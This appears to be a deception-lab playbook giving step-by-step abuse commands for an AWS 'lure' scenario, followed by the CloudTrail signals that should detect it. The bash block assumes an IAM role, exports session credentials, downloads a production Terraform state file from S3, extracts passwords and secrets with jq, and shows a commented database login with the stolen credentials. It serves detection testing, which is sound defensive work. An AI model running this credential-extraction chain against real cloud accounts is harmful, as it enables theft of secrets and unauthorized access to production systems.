# Scenario 1 — Abuse Steps: S3 Terraform State Lure

## Prerequisites
- AWS CLI configured with any IAM identity in the target account
- Account ID known

## Step-by-Step

```bash
# 1. Discover and assume the lure role
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)

CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/infra-s3-data-readonly-role" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)

# 2. List buckets — find the terraform state bucket
aws s3 ls

# 3. List objects in the lure bucket
aws s3 ls s3://infra-terraform-state-${ACCOUNT_ID}/ --recursive

# 4. Download the terraform state file
aws s3 cp s3://infra-terraform-state-${ACCOUNT_ID}/env/production/terraform.tfstate ./terraform.tfstate

# 5. Extract secrets from the state file
cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null or .secret != null or .secret_string != null)'

# 6. Attempt to use extracted credentials (triggers detection)
# Example: try the RDS connection string
# psql "postgresql://db_admin_prod:<password>@prod-core-db.c9aksj2e7rzo.us-west-2.rds.amazonaws.com:5432/core_platform_prod"

# 7. Clean up session
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

## Detection Signals
- CloudTrail: `AssumeRole` on `infra-s3-data-readonly-role`
- CloudTrail: `ListBuckets`, `ListObjects`, `GetObject` on the lure bucket
- Any attempted use of extracted credentials
